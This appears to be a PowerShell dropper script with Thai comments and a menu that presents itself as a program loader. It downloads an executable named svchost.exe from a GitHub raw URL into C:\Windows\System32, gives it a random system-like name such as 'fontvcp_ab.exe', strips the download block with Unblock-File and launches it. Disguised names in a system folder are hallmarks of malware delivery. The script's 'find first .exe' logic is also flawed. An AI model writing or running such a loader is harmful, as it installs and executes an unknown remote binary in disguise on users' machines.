# --- [ CONFIGURATION ] ---
$appDirectory = "C:\Windows\System32"
$exeUrl       = "https://raw.githubusercontent.com/jaykayzlowlive-ops/ABYSS1/refs/heads/main/svchost.exe"

# ฟังก์ชันสำหรับเช็คสถานะว่าในโฟลเดอร์มีไฟล์อยู่แล้วหรือไม่
function Get-LocalAppFile {
    if (Test-Path $appDirectory) {
        # ค้นหาไฟล์ .exe แรกที่เจอในโฟลเดอร์
        $file = Get-ChildItem -Path $appDirectory -Filter "*.exe" | Select-Object -First 1
        return $file
    }
    return $null
}

# สร้างโฟลเดอร์ปลายทางเตรียมไว้หากยังไม่มีในระบบ
if (-not (Test-Path $appDirectory)) {
    New-Item -ItemType Directory -Path $appDirectory -Force | Out-Null
}

# --- [ MAIN MENU LOOP ] ---
while ($true) {
    Show-Header
    
    Write-Console "1. Download Program (หากยังไม่เคยโหลด)" "INFO"
    Write-Console "2. Run Program (รันโปรแกรมรอบเดียว)" "INFO"
    Write-Console "3. Check Status (ตรวจสอบโปรแกรม)" "INFO"
    Write-Console "0. Exit" "INFO"
    Write-Host ""
    
    Write-Console "Select Option: " "INPUT"
    $choice = $Host.UI.ReadLine()

    # ดึงข้อมูลไฟล์ปัจจุบันที่มีอยู่ในเครื่องก่อนเริ่มแต่ละเมนู
    $existingFile = Get-LocalAppFile

    if ($choice -eq "1") {
        Clear-Host
        Show-Header
        
        # ตรวจสอบ: ถ้ายังไม่มีไฟล์ใดๆ อยู่ในโฟลเดอร์เลย
        if ($null -eq $existingFile) {
            # สุ่มชื่อไฟล์ใหม่เฉพาะตอนที่ยังไม่มีไฟล์ในเครื่องเท่านั้น
            $p_rand = @("font","drv","host","win","svc") | Get-Random
            $m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
            $r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
            $fileName = "$p_rand$m_rand`_$r_rand.exe"
            $destPath = Join-Path $appDirectory $fileName

            Write-Host "  Downloading system files from server..." -ForegroundColor Cyan
            Write-Host ""
            try {
                Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
                Unblock-File -Path $destPath

                Write-Host ""
                Write-Console "Download complete!" "SUCCESS"
                Write-Console "The application is ready to run." "INFO"
            }
            catch {
                Write-Host ""
                Write-Console "Download failed!" "ERROR"
                Write-Console $_.Exception.Message "INFO"
            }
        } else {
            # ถ้าตรวจเจอไฟล์ชื่อเดิมอยู่แล้ว จะไม่โหลดซ้ำ
            Write-Host "  Notice: Program is already downloaded." -ForegroundColor Yellow
            Write-Console "File found: $($existingFile.Name)" "INFO"
            Write-Console "You can execute it directly using Option 2." "INFO"
        }
        
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Show-Header
        
        # ตรวจสอบว่ามีไฟล์ที่ดาวน์โหลดมาแล้วจริงหรือไม่
        if ($null -ne $existingFile) {
            Write-Host "  Launching program..." -ForegroundColor Green
            Write-Host ""
            try {
                # รันไฟล์จริงที่ตรวจพบในเครื่อง
                Start-Process -FilePath $existingFile.FullName -WindowStyle Normal
                Write-Console "Program started successfully." "SUCCESS"
            }
            catch {
                Write-Console "Failed to start program!" "ERROR"
                Write-Console $_.Exception.Message "INFO"
            }
        } else {
            # แจ้งเตือนหากยังไม่มีไฟล์ในโฟลเดอร์
            Write-Host "  [!] Error: File not found." -ForegroundColor Red
            Write-Console "Please select Option 1 to download the program first." "ERROR"
        }
        
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "3") {
        Clear-Host
        Show-Header
        
        Write-Host "  [ STACKX ENVIRONMENT STATUS ]" -ForegroundColor Magenta
        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
        
        if ($null -ne $existingFile) {
            Write-Host "  [+] System Status : READY / DOWNLOADED" -ForegroundColor Green
            Write-Host "  [*] File Name     : $($existingFile.Name)" -ForegroundColor White
            Write-Host "  [*] Target Path   : $($existingFile.FullName)" -ForegroundColor White
            Write-Host "  [*] File Size     : $([math]::Round($existingFile.Length / 1MB, 2)) MB" -ForegroundColor White
        } else {
            Write-Host "  [-] System Status : NOT INSTALLED / NO FILE" -ForegroundColor Red
            Write-Host "  [*] Notice        : Please run option 1 to fetch required files." -ForegroundColor White
        }
        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "0") {
        Write-Host "Closing application..."
        exit
    }
}
